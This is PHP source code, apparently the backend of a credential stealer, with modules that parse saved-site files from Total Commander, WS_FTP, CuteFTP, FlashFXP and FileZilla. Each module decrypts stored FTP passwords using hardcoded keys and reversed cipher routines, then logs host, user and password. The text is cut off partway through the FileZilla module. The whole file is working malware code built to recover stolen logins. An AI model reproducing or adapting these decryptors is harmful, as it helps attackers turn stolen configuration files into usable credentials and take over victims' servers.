// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// Windows/Total Commander

class module_wtc extends module
{
	protected function decrypt($pass)
	{
		if (strlen($pass) <= 0)
			return false;

		if ($pass[0] == "!")
		{
			//$this->log->add("NOTIFY_MASTER_PASSWORD_CANNOT_DECRYPT");
			return false;
		}

		if ((strlen($pass) % 2) != 0 || strlen($pass) <= 4)
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			return false;
		}

		$data = hextostr($pass);

		if ($data === false)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return false;
		}

		$crc = substr($data, strlen($data)-4);
		$data = substr($data, 0, -4);
		$seed = 0xcf671;

		for ($i = 0; $i < strlen($data); $i++)
		{
			$k = myrand(8, $seed);
			$data[$i] = chr(((ord($data[$i]) << $k) & 0xff | (ord($data[$i]) >> (8-$k)) & 0xff ) & 0xff);
		}

		$seed = 0x3039;
		for ($i = 0; $i < 256; $i++)
		{
			$k = myrand(strlen($data), $seed);
			$p = myrand(strlen($data), $seed);
			$c = $data[$k];
			$data[$k] = $data[$p];
			$data[$p] = $c;
		}

		$seed = 0xa564;
		for ($i = 0; $i < strlen($data); $i++)
			$data[$i] = chr(ord($data[$i]) ^ myrand(0x100, $seed));

		$seed = 0xd431;
		for ($i = 0; $i < strlen($data); $i++)
			$data[$i] = chr(ord($data[$i]) + 0x100 - myrand(0x100, $seed));

		if (crc32b_str($data) != data_int32($crc))
		{
			$this->log->add("ERR_CRC32_PASS_MISMATCH");
			return false;
		}

		return $data;
	}

	protected function import_item($stream, $id)
	{
		if ($id != 0x0000)
		{
			$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
			return false;
		}

		$parsed_ini = parse_ini($stream->read_str());
		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section["host"]);
			$user = assign($section["username"]);
			$pass = $this->decrypt(assign($section["password"]));
			$dir = assign($section["directory"]);
			$this->add_ftp(append_dir($host, $dir), $user, $pass);
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// WS_FTP

class module_ws_ftp extends module
{
	protected function decrypt($pass)
	{
		if (!strlen($pass))
			return false;

        if ($pass[0] == '_')
        {
			// new decryption algorithm
  	        $data = base64_decode(substr($pass, 1), true);

	        if (!strlen($data))
        		return false;

			$des_key = chr(0xE1).chr(0xF0).chr(0xC3).chr(0xD2).chr(0xA5).chr(0xB4).chr(0x87).chr(0x96).
					   chr(0x69).chr(0x78).chr(0x4B).chr(0x5A).chr(0x2D).chr(0x3C).chr(0x0F).chr(0x1E).
                       chr(0x34).chr(0x12).chr(0x78).chr(0x56).chr(0xAB).chr(0x90).chr(0xEF).chr(0xCD);


	        $iv = substr($des_key, 16);
			$data = mcrypt_decrypt(MCRYPT_3DES, $des_key, $data, MCRYPT_MODE_CBC, $iv);

			if (!strlen($data))
			{
				$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
			}

			return ztrim($data);
		} else
		{
			// old decryption algorithm
			$offset = 1;
			$result = "";
			$i = 33;

			while ($i < strlen($pass)-1)
			{
				$eax = ord($pass[$i]);
				if ($eax > 0x39)
					$eax = _BF_SUB32($eax, 0x37);
				else
					$eax = _BF_SUB32($eax, 0x30);

				$ebx = _BF_SHL32($eax, 4);

				$eax = ord($pass[$i+1]);
				if ($eax > 0x39)
					$eax = _BF_SUB32($eax, 0x37);
				else
					$eax = _BF_SUB32($eax, 0x30);
				$ebx = _BF_ADD32($ebx, $eax);

				$eax = ord($pass[$offset]) & 0x3f;
				$ebx = _BF_SUB32(_BF_SUB32($ebx, $eax), $offset-1);
				$offset++;

				if ($offset > 33)
					break;

				$result .= chr($ebx);

				$i += 2;
			}

			return ztrim($result);
		}
	}

	protected function process_ini($value)
	{
		if (!strlen($value))
			return;

		$parsed_ini = parse_ini($value);
		foreach ($parsed_ini as $section)
		{
			if (!is_array($section))
				continue;
			if (nonempty($section["host"]) &&
			  nonempty($section["uid"]) &&
			  nonempty($section["pwd"]))
			{
				// detect connection type
				$conntype = assign($section["conntype"]);

				switch ($conntype)
				{
					//case "3": $conntype = "ftpes://"; break;
					case "4": $conntype = "sftp://"; break;
					//case "5": $conntype = "ftps://"; break;
					default: $conntype = "ftp://"; break;
				}

				$host = strip_quotes($section["host"]);
				$user = strip_quotes($section["uid"]);
				$pass = $this->decrypt(strip_quotes($section["pwd"]));

				$this->add_ftp($conntype.append_port_dir($host, $section["port"], $section["dir"]), $user, $pass);
			}
		}
	}

	protected function import_item($stream, $id)
	{
		if ($id != 0x0000)
		{
			$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
			return false;
		}
		$this->process_ini($stream->read_str());
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// CuteFTP Pro/Home/Lite

class stream_cute extends stream
{
	public function read_bytestring_unicode()
	{
		if (!$this->state)
			return false;
		$l = $this->read_byte();
		if ($l == 0xff)
			$l = $this->read_word();
		if ($l == 0xffff)
			$l = $this->read_dword();
		return $this->read_strlen($l*2);
	}

	public function read_bytestring($is_pass = false)
	{
		if (!$this->state)
			return false;
		$l = $this->read_byte();
		if ($l == 0xff)
			$l = $this->read_word();
		if ($l == 0xfffe)
		{
			// unicode
			$data = $this->read_bytestring_unicode();
			if ($is_pass)
			{
				$data = module_cuteftp::DecryptPassNew($data, true);
			}
			return unicode_to_ansi($data);
		}
		if ($l == 0xffff)
			$l = $this->read_dword();
		if ($is_pass)
			return module_cuteftp::DecryptPassNew($this->read_strlen($l));
		else
			return $this->read_strlen($l);

	}
}

class module_cuteftp extends module
{
	private $CuteFTPItem = array();

	function handle_host($stream)
	{
        if ($stream->state)
			if (nonempty($this->CuteFTPItem["host"]) && nonempty($this->CuteFTPItem["user"]) && nonempty($this->CuteFTPItem["pass"]))
			{
				$this->add_ftp(append_port_dir(ftp_force_ssh($this->CuteFTPItem["host"], assign($this->CuteFTPItem['proto']) == '3'), $this->CuteFTPItem["port"], $this->CuteFTPItem["dir"]), $this->CuteFTPItem["user"], $this->CuteFTPItem["pass"]);
			}
	}

	static function char_swap(&$v, $a, $b)
	{
		$t = $v[$a];
		$v[$a] = $v[$b];
		$v[$b] = $t;
	}

	static function DecryptPassNew($pass, $is_unicode = false)
	{
		$key = chr(0x32).chr(0x24).chr(0x11).chr(0x52).chr(0x02).chr(0x6F).chr(0x4F).chr(0x78);
		$iv = chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0);

		if (!strlen($pass) || ((strlen($pass) % 8) != 0))
			return "";

		// change endianity
		for ($i = 0; $i < strlen($pass); $i+=4)
		{
			self::char_swap($pass, $i, $i+3);
			self::char_swap($pass, $i+1, $i+2);
		}

		$pass = mcrypt_decrypt(MCRYPT_BLOWFISH, $key, $pass, MCRYPT_MODE_CBC, $iv);
		if (!strlen($pass))
		{
			$this->log->add('ERR_CANNOT_DECRYPT_PASSWORD');
		}

		// restore endianness
  		for ($i = 0; $i < strlen($pass); $i+=4)
		{
			self::char_swap($pass, $i, $i+3);
			self::char_swap($pass, $i+1, $i+2);
		}

		if ($is_unicode) 
		{
			return ztrim_unicode($pass);
		}
		else
		{
			return ztrim($pass);
		}
	}

	function DecryptPass($pass)
	{
		for ($i = 0; $i < strlen($pass); $i++)
			$pass[$i] = chr(ord($pass[$i]) ^ 0xc8);
		return $pass;
	}

	function Handle3_4($stream, $Is4)
	{
		$this->CuteFTPItem["host"] = $stream->read_bytestring();
		$this->CuteFTPItem["user"] = $stream->read_bytestring();
		$this->CuteFTPItem["pass"] = $stream->read_bytestring();
        if ($Is4 > 1)
            $this->CuteFTPItem["pass"] = $this->DecryptPass($this->CuteFTPItem["pass"]);
		$this->CuteFTPItem["dir"] = $stream->read_bytestring();

		$stream->read_bytestring(); // LocalFolder
		$this->CuteFTPItem["port"] = $stream->read_dword(); // Port
		$stream->read_dword(); // LoginMethod
		$stream->read_dword(); // TransferType
		$stream->read_dword(); // HostType

		$stream->read_dword(); // ConnectionRetries
		$stream->read_dword(); // RetriesDelay
		$stream->read_dword(); // MaxIndexSize
		$stream->read_dword(); // UseLogicalParentDir
		$stream->read_dword(); // AutoCacheIndex
		$stream->read_dword(); // UseAutoRenameScheme

		$stream->read_dword(); // SmartKeepAlive
		$stream->read_dword(); // Unknown
		$stream->read_dword(); // SimpleDirListing
		$stream->read_dword(); // AddSiteToShell
		$stream->read_dword(); // UsePasvMode
		$stream->read_dword(); // RenameSchemeType

		$stream->read_bytestring(); // Description

		$this->handle_host($stream);
		$this->CuteFTPItem = array();

		$stream->read_dword(); // UseFirewallSettings
		$stream->read_dword(); // EnableFilter

		$stream->read_dword(); // Unknown
		$stream->read_dword(); // Unknown
		$stream->read_dword(); // SaveSessLogToFile
		$stream->read_dword(); // CacheSiteResume

		$unk_subversion = $stream->read_dword(); // Unknown
		$stream->read_dword(); // ApplyFiltersLocal
		$stream->read_dword(); // ApplyFiltersRemote
		$stream->read_dword(); // ApplyFiltersFolder
		$stream->read_dword(); // EnableRemFilters
		$stream->read_bytestring(); // RemoteFilter

		$stream->read_dword(); // ApplyFiltersUploads
		$stream->read_dword(); // ApplyFiltersDownloads
		$stream->read_dword(); // ApplyFiltersSiteToSite
		$stream->read_dword(); // CaseSensitiveFiltering

		// Filter mask
		$FiltCount = $stream->read_word();
		for ($i = 0; $i < $FiltCount; $i++)
			$stream->read_bytestring(); // Filter

		// Filter NOT mask
		$FiltCount = $stream->read_word();
		for ($i = 0; $i < $FiltCount; $i++)
			$stream->read_bytestring(); // NotFilter

        if ($Is4 > 1)
        {
            if ($unk_subversion == 1)
            {
                $stream->read_skip(8);
            } else
            {
                $stream->read_dword(); // EnableLocalFilters
                $stream->read_dword(); // LastSessionStart
                $stream->read_dword(); // LastSessionEnd
            }
        }

		if ($Is4 == 4)
			$stream->read_dword(); // CheckFileSizeOnDownl
	}

	function Handle65_66($stream, $ver)
	{
		$this->CuteFTPItem["host"] = $stream->read_bytestring();
		$stream->read_dword(); // LoginMethod
		$this->CuteFTPItem["user"] = $stream->read_bytestring();
		$this->CuteFTPItem["pass"] = $this->DecryptPass($stream->read_bytestring());
		$stream->read_bytestring(); // Description

		$this->CuteFTPItem["proto"] = $stream->read_dword(); // Protocol
		$this->CuteFTPItem["port"] = $stream->read_dword(); // Port
		$stream->read_dword(); // ServerType
		$stream->read_dword(); // DataConnType
		$stream->read_dword(); // TransferType

		$this->CuteFTPItem["dir"] = $stream->read_bytestring();

		$this->handle_host($stream);
		$this->CuteFTPItem = array();

		$stream->read_bytestring(); // LocalFolder

		$stream->read_dword(); // CachingOptions
		$stream->read_dword(); // Unknown
		$stream->read_dword(); // UpldCaseOptions
		$stream->read_dword(); // Unknown
		$stream->read_dword(); // EnableFiltering
		$stream->read_dword(); // Unknown
		$stream->read_dword(); // ApplyFiltersToFolders
		$stream->read_dword(); // EnableRemFilters

		$stream->read_bytestring(); // RemoteFilter
		$stream->read_dword(); // Unknown
		$stream->read_dword(); // ApplyFiltersTransfers
		$stream->read_dword(); // Unknown
		$stream->read_dword(); // CaseSensFilters

		// Filter mask
		$FiltCount = $stream->read_word();
		for ($i = 0; $i < $FiltCount; $i++)
			$stream->read_bytestring(); // Filter

		// Filter NOT mask
		$FiltCount = $stream->read_word();
		for ($i = 0; $i < $FiltCount; $i++)
			$stream->read_bytestring(); // NotFilter

		$stream->read_dword(); // Unknown
		$stream->read_dword(); // SiteConfOptions
		$stream->read_dword(); // ApplyAutoRename
		$stream->read_dword(); // RawListing

		// Proxy
		$stream->read_word(); // Unknown
		$stream->read_bytestring(); // ProxyHost
		$stream->read_dword(); // ProxyPort
		$stream->read_bytestring(); // ProxyUser
		$stream->read_bytestring(); // ProxyPass
		$stream->read_dword(); // ProxyType
		$stream->read_dword(); // ProxyUseAuth
		$stream->read_dword(); // ProxyAuthType
		$stream->read_bytestring(); // ProxyUser@

		// Proxy custom login sequence
		$FiltCount = $stream->read_word(); // LinesCount
		for ($i = 0; $i < $FiltCount; $i++)
			$stream->read_bytestring(); // SingleLine

		// Socks
		$stream->read_word(); // Unknown
		$stream->read_bytestring(); // SocksHost
		$stream->read_dword(); // SocksPort
		$stream->read_bytestring(); // SocksUser
		$stream->read_bytestring(); // SocksPass
		$stream->read_dword(); // SocksType
		$stream->read_dword(); // SocksUseAuth

		$stream->read_dword(); // ConnRetryAttmps
		$stream->read_dword(); // ConnRetryDelay

		if ($ver == 0x66)
			$stream->read_dword(); // FTPPasswdProtect
	}

	function Handle68_69_6c($stream, $Is69)
	{
		if ($Is69 >= 0x6c)
		{
			// 12 unknown flags
			$stream->read_dword();
			$stream->read_dword();
			$stream->read_dword();
		}

		if ($Is69 >= 0x6e)
		{
			// 8 unknown flags
			$stream->read_dword();
			$stream->read_dword();
		}

		if ($Is69 >= 0x6f)
		{
			// 1 unknown byte flag
			$stream->read_byte();
		}

		if ($Is69 >= 0x70)
		{
			// 1 unknown dword flag
			$stream->read_dword();
		}

		if ($Is69 >= 0x69)
			$stream->read_bytestring(); // TimeZone

		$stream->read_dword(); // MaxConnPerSite
		$stream->read_dword(); // Flags
		$this->CuteFTPItem["host"] = $stream->read_bytestring();
		$host = $this->CuteFTPItem["host"];
		$stream->read_dword(); // LoginMethod
		if ($Is69 >= 0x6d)
		{
			$this->CuteFTPItem["user"] = $stream->read_bytestring(true);
			$this->CuteFTPItem["pass"] = $stream->read_bytestring(true);
		} else
		{
			$this->CuteFTPItem["user"] = $stream->read_bytestring();
			$this->CuteFTPItem["pass"] = $this->DecryptPass($stream->read_bytestring());
		}
		$stream->read_bytestring(); // description

		$this->CuteFTPItem["proto"] = $stream->read_dword(); // Protocol
		$this->CuteFTPItem["port"] = $stream->read_dword(); // Port
		$stream->read_dword(); // ServerType
		$stream->read_dword(); // DataConnType
		$stream->read_dword(); // TransferType

		$this->CuteFTPItem["dir"] = $stream->read_bytestring();

		$this->handle_host($stream);
		$this->CuteFTPItem = array();

		$stream->read_bytestring(); // LocalFolder

		$stream->read_dword(); // CachingOptions
		$stream->read_dword(); // Unknown
		$stream->read_dword(); // UpldCaseOptions
		$unk_subversion = $stream->read_dword(); // Unknown

        if ($unk_subversion == 2 && $Is69 == 0x68)
            $stream->read_skip(30);

		$stream->read_dword(); // FilterFlags

		$stream->read_bytestring(); // RemoteFilter

		// Filter mask
		$FiltCount = $stream->read_word();
		for ($i = 0; $i < $FiltCount; $i++)
			$stream->read_bytestring(); // Filter

		// Filter NOT mask
		$FiltCount = $stream->read_word();
		for ($i = 0; $i < $FiltCount; $i++)
			$stream->read_bytestring(); // NotFilter

		$stream->read_dword(); // SiteConfOptions
		$stream->read_dword(); // ApplyAutoRename
		$stream->read_dword(); // NLSTList

        if ($unk_subversion == 2 && $Is69 == 0x68)
            $stream->read_skip(1);

		// Proxy
		$stream->read_word(); // Unknown
		$stream->read_bytestring(); // ProxyHost
		$stream->read_dword(); // ProxyPort
		$stream->read_bytestring(); // ProxyUser
		$stream->read_bytestring(); // ProxyPass
		$stream->read_dword(); // ProxyType
		$stream->read_dword(); // ProxyUseAuth
		$stream->read_dword(); // ProxyAuthType
		$stream->read_bytestring(); // ProxyUser@

		// Proxy custom login sequence
		$FiltCount = $stream->read_word(); // LinesCount
		for ($i = 0; $i < $FiltCount; $i++)
			$stream->read_bytestring(); // SingleLine

		// Socks
		$stream->read_word(); // Unknown
		$stream->read_bytestring(); // SocksHost
		$stream->read_dword(); // SocksPort

		// !NB: both encrypted in 0x6d+ versions
		$stream->read_bytestring(); // SocksUser
		$stream->read_bytestring(); // SocksPass

		$stream->read_dword(); // SocksType
		$stream->read_dword(); // SocksUseAuth

		$stream->read_dword(); // ConnRetryAttmps
		$stream->read_dword(); // ConnRetryDelay
		$stream->read_dword(); // FTPPasswdProtect

		if ($host == 'webdav.tappin.com')
		{
			// 12 TappIn flags
			$stream->read_dword();
			$stream->read_dword();
			$stream->read_dword();

			$stream->read_bytestring(); // Friend
			$stream->read_bytestring(); // ShareName
			$stream->read_bytestring(); // TappInFriendFolder
			$stream->read_bytestring(); // TappInRemoteFolder
		}

	}

	protected function process_bookmarks($stream, $BookmarksCount)
	{
		$CSeparator = $stream->read_word();

		if (!$BookmarksCount)
			return;

		if ($CSeparator == 0xffff)
		{
			$stream->read_word(); // Separator2
			$stream->read_strlen($stream->read_word()); // TypeName
		}

		for ($i = 0; $i < $BookmarksCount; $i++)
		{
			$stream->read_dword(); // Ident
			$stream->read_bytestring(); // BookmarkName
			$stream->read_bytestring(); // RemPath
			$stream->read_bytestring(); // LocPath
			$stream->read_dword(); // UseDefPath
			$stream->read_word(); // Separator
		}
	}

	protected function process_dat($value, $isquick)
	{
		if (strlen($value) <= 8)
			return false;

		$stream = new stream_cute($value, $this->log);

		if (!$isquick)
		{
			// check .dat version
			if (($stream->datalen < 17) || ($stream->read_dword() != 0x130))
		    {
                // not a cute ftp file
    			return true;
			}
		    $stream->read_byte(); // SubVersion
		    $stream->read_dword(); // NextID
		    $CEntriesCount = $stream->read_dword();
		    $stream->read_dword(); // DefaultID
		} else
		{
			if ($stream->datalen < 8)
			    return false;
			$CEntriesCount = $stream->read_dword();
			$stream->read_dword();
		}

		$CType = ''; $CSeparator = 0; $j = 0;
		while ($stream->state)
		{
			// Types & Entries
			if (($CSeparator == 0xffff) || ($CType == ''))
			{
				// New type found
				if ($CSeparator != 0xffff)
					$stream->read_word(); // First separator
				$stream->read_word(); // Unknown

				// Type
				$CType = $stream->read_strlen($stream->read_word());
				$CSeparator = 0;
			} else
			{
				// Check if out parser supports certain object type
				if (($CType != 'CTreeItem') && ($CType != 'CSMFTPItem') && ($CType != 'CSMSite') && ($CType != 'CTappInSite'))
				{
					$this->log->add("ERR_CUTEFTP_VER");
					return false;
				}

				$stream->read_dword(); // Ident
				$stream->read_dword(); // ID
				$SubType = $stream->read_dword(); // Subtype
				$stream->read_dword(); // ParentID
				$this->CuteFTPItem["name"] = $stream->read_bytestring(); // ItemName
				$stream->read_dword(); // Icon

				switch ($SubType)
				{
					case 0:
						// FtpItem
						$stream->read_dword(); // 0 - has bookmarks; 1 - has no bookmarks
						$stream->read_dword(); // Flags
						$this->process_bookmarks($stream, $stream->read_word());

						$CObjVersion = $stream->read_dword();

						// Select data handler
						switch ($CObjVersion)
						{
							case 0x01:
                            case 0x03:
                            case 0x04:
								$this->Handle3_4($stream, $CObjVersion); // 4.0, 4.1
								break;
							case 0x65:
							case 0x66:
								$this->Handle65_66($stream, $CObjVersion); // 1.0 Pro
								break;
							case 0x68:
								$this->Handle68_69_6c($stream, $CObjVersion); // 2.0 Pro
								break;
							case 0x69:
								$this->Handle68_69_6c($stream, $CObjVersion); // 3.0 Pro, 6.0 Home/Pro, 7.0 Home/Pro
								break;
							case 0x6c:
								$this->Handle68_69_6c($stream, $CObjVersion); // 8.0 Pro
								break;
							case 0x6d:
								$this->Handle68_69_6c($stream, $CObjVersion); // 8.3 Pro
								break;
							case 0x6e: // 9.0
							case 0x6f: // 9.0.4
							case 0x70: // 9.0.5
								$this->Handle68_69_6c($stream, $CObjVersion); // CuteFTP 9.X
								break;
							default:
								$this->log->add("ERR_CUTEFTP_VER: ".$CObjVersion);
								return false;
						}

						$j = $j + 1;
						if ($j == $CEntriesCount)
							return true;

						$CSeparator = $stream->read_word();

						break;
					case 1:
						// TreeItem
						$stream->read_dword(); // ShowContents
						$stream->read_word(); // Unknown
						$stream->read_dword(); // Unknown
						$SubItemsCount = $stream->read_word();

						for ($i = 0; $i < $SubItemsCount; $i++)
							$stream->read_dword(); // SubItem

						$j = $j + 1;
						if ($j == $CEntriesCount)
							return true;

						$CSeparator = $stream->read_word();
						break;
					default:
						$this->log->add("ERR_CUTEFTP_VER");
						return false;
				}
			}
		}
		if (!$stream->state)
			$this->log->add("ERR_CUTEFTP_DAT_PROCESS_ERROR");

		return $stream->state;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// sm.dat
				$this->process_dat($stream->read_str(), false);
				break;
			case 0x0001:
				// quick connections
				$this->process_dat($stream->read_str(), true);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FlashFXP

class module_flashfxp extends module
{
	protected function decrypt($pass, $key = 'yA36zA48dEhfrvghGRg57h5UlDv3')
	{
		if (!strlen($pass) || !strlen($key))
			return false;

		$hex_str = hextostr($pass);

		if ($hex_str === false)
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return false;
		}

		$result = '';
		$old = ord($hex_str[0]); $k = 0;
		for ($i = 1; $i < strlen($hex_str); $i++)
		{
			$new = ord($hex_str[$i]) ^ ord($key[$k++ % strlen($key)]);
			if ($old >= $new)
				$new--;
			$result .= chr($new-$old);
			$old = ord($hex_str[$i]);
		}

		return $result;
	}

	protected function process_ini($value, $id)
	{
		if ($id == 2)
		{
			// saved history
			$values = parse_lines($value);
			foreach ($values as $line)
			{
				$decrypted_line = $this->decrypt($line);
				$decrypted_line = substr($decrypted_line, strpos($decrypted_line, chr(4))+1);
				$split_values = explode(chr(5), $decrypted_line);

				if (count($split_values) >= 5)
				{
					$host = trim($split_values[0]);
					$user = trim($split_values[1]);
					$pass = trim($split_values[2]);
					$port = trim($split_values[3]);
					$dir = trim($split_values[4]);

					$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
				}
			}

			return;
		}
		$parsed_ini = parse_ini($value);
		foreach ($parsed_ini as $secname=>$section)
		{
			if (!is_array($section))
				continue;
			$host = assign($section['ip']);
			$user = assign($section['user']);
			if ($id == 1)
				$pass = $this->decrypt(assign($section['pass']), $secname);
			else
				$pass = $this->decrypt(assign($section['pass']));
			$dir = assign($section['path']);
			$port = assign($section['port']);
			$options = assign($section['options']);
			$proto = 0;
			if (strlen($options) >= 39)
			{
				if ($options[38] == '1')
					$proto = 1;
			}
			$this->add_ftp(append_port_dir(ftp_force_ssh($host, $proto == 1), $port, $dir), $user, $pass);
		}
	}

	protected function import_item($stream, $id)
	{
		if ($id != 0x0000 && $id != 0x0001 && $id != 0x0002)
		{
			$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
			return false;
		}
		$this->process_ini($stream->read_str(), $id);
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FileZilla

class module_filezilla extends module
{
	private $last_server = array();
	private $is_v3 = false;
	private $is_converted = false;

	private function dec_utf8($value)
	{
		if (!strlen($value))
			return '';
		if ($this->is_converted)
			return utf8_decode($value);
		else
			return Utf8ToWin($value);
	}

	protected function decrypt($pass)
	{
		if (!strlen($pass) || (strlen($pass) % 3 != 0))
			return false;

		$key = 'FILEZILLA1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$p = ((int_divide(strlen($pass), 3)) % 0x2d);

		$result = '';

		$len = int_divide(strlen($pass), 3);
		for ($i = 0; $i < $len; $i++)
		{
			$num = substr($pass, $i*3, 3);
			if (!is_num($num))
				return false;

			$result .= chr(ord($key[$p++ % strlen($key)]) ^ intval($num));
		}

		return $result;
	}

	protected function fix_dir($value)
	{
		$value = trim($value);

		if (!strlen($value))
			return '';

		if (strpos($value, ' ') !== false)
		{
			$dir_parts = explode(' ', $value);
			if (count($dir_parts) > 2 && ((count($dir_parts) % 2) == 0) && $dir_parts[1] === '0')
			{
				$result = '';
				for ($i = 2; $i < count($dir_parts); $i+=2)
				{
					if (strlen($dir_parts[$i+1]) && strlen($dir_parts[$i+1]) == intval($dir_parts[$i]))
					{
						$result .= '/'.$dir_parts[$i+1];
					} else
					{
						// something went wrong
						return $value;
					}
				}
			} else
			{
				return $value;
			}
			return $result;
		} else
			return $value;
	}

    private function fix_entities($encoded_value)
    {
        if (!strlen($encoded_value))
            return '';
        if (strpos($encoded_value, '_zomgencodedentity_') === false)
            return $encoded_value;

        return html_entity_decode(str_replace('_zomgencodedentity_', '&#', $encoded_value), ENT_COMPAT, 'Windows-1251');
    }

	protected function read_xml_item($xml_array, $require_decryption)
	{
		$host = $this->fix_entities($this->dec_utf8(assign($xml_array['Host'])));
		$user = $this->fix_entities($this->dec_utf8(assign($xml_array['User'])));
		$pass = assign($xml_array['Pass']);
		// decrypt pass if required
		if (strlen($pass) && $require_decryption)
		{
			$pass = $this->decrypt($pass);
		}
		else
			$pass = $this->fix_entities($this->dec_utf8($pass));
		$port = $this->fix_entities($this->dec_utf8(assign($xml_array['Port'])));
		$protocol = $this->fix_entities($this->dec_utf8(assign($xml_array['Protocol'])));
		if ($protocol == '')
		{
			// Older XML files, SFTP protocol equals to ServerType=3
			$protocol = $this->fix_entities($this->dec_utf8(assign($xml_array['ServerType'])));
			if ($protocol == '3')
				$protocol = '1';
			else
				$protocol = '';			
		}
		$dir = str_replace('%20', ' ', $this->fix_entities($this->fix_dir($this->dec_utf8(assign($xml_array['RemoteDir'])))));

		$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == '1'), $port, $dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value, $require_decryption);
		}
	}

	protected function read_xml_last_server($xml_array, $parent_value)
	{
		$name = assign($xml_array['name']);

		if ($name == 'Last Server Host') $this->last_server['host'] = $this->fix_entities($this->dec_utf8(assign($parent_value)));
		if ($name == 'Last Server Port') $this->last_server['port'] = $this->fix_entities($this->dec_utf8(assign($parent_value)));
		if ($name == 'Last Server Type') $this->last_server['protocol'] = $this->fix_entities($this->dec_utf8(assign($parent_value)));
		if ($name == 'Last Server Path') $this->last_server['dir'] = $this->fix_entities($this->dec_utf8(assign($parent_value)));
		if ($name == 'Last Server User') $this->last_server['user'] = $this->fix_entities($this->dec_utf8(assign($parent_value)));
		if ($name == 'Last Server Pass') $this->last_server['pass'] = $parent_value;

		$parent_value = assign($xml_array['value']);
		foreach ($xml_array as $value)
		{
			if (is_array($value))
			{
				$this->read_xml_last_server($value, $parent_value);
			}
		}
	}

	protected function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if ((strval($key) == 'Server' || strval($key) == 'LastServer' || strval($key) == 'Site') && is_array($value))
				{
					$require_decryption = false;

					if (strval($key) == 'Site')
						$require_decryption = true;
					if (strval($key) == 'Server' && !$this->is_v3)
						$require_decryption = true;

					$this->read_xml_item($value, $require_decryption);
				}
				if (strval($key) == 'Settings' && is_array($value))
				{
					$this->read_xml_last_server($value, '');
					
				}
				$this->rec_scan_xml_array($value);
			}
		}
	}

	protected function process_xml($value)
	{
        $value = trim($value);

        $this->last_server = array();
        $this->is_v3 = strpos($value, '<FileZilla3') !== false;
        $this->is_converted = false;

		if (!strlen($value))
			return;

        // file will be always processed as UTF-8
        if (strpos($value, 'UTF-8') === false && strpos($value, 'utf-8') === false)
        {
            $value = utf8_encode($value);
        	$value = str_replace('encoding="ISO-8859-1"', 'encoding="UTF-8"', $value);
        	$this->is_converted = true;
        }

        // fix encoded url entities
        $value = str_replace('&#', '_zomgencodedentity_', $value);

        // fix non-closed tags
        if ((strpos($value, '<Settings>') !== false) && (strpos($value, '</Settings>') === false) &&
            (strpos($value, '<FileZilla3>') !== false))
        {
        	$value .= "\r\n</Settings></FileZilla3>";
        }

        $xml_parser = new XMLParser($value);

		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);

			/* Process Last Server stored in older XML files */

			$host = assign($this->last_server['host']);
			$port = assign($this->last_server['port']);
			$proto = assign($this->last_server['protocol']);
			$dir = assign($this->last_server['dir']);
			$user = assign($this->last_server['user']);
			$pass = $this->decrypt(assign($this->last_server['pass']));

			if ($proto == 0x1002)
				$proto = 3;

			$this->add_ftp(append_port_dir(ftp_force_ssh($host, $proto == 3), $port, $dir), $user, $pass);

		} else
		{
        	$this->log->add("ERR_XML_PARSE");
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0001:
			case 0x0002:
				$this->process_xml($stream->read_str(), $id);
				break;
			case 0x0003:
			case 0x0013:
				// port stored as string
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $this->decrypt($stream->read_str());
				$port = $stream->read_str();
				$dir = $stream->read_str();

				if (($id & 0x10) > 0)
				{
					$proto = $stream->read_dword();
					if ($proto == 0x1002)
						$proto = 3;
				}
				else
				{
					$proto = 0;
				}

				$this->add_ftp(append_port_dir(ftp_force_ssh($host, $proto == 3), $port, $dir), $user, $pass);
				break;
			case 0x0004:
			case 0x0014:
				// port stored as dword
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $this->decrypt($stream->read_str());
				$port = $stream->read_str();
				if (strlen($port) == 4)
					$port = strval(data_int32($port));
				else
					$port = '';
				$dir = $stream->read_str();

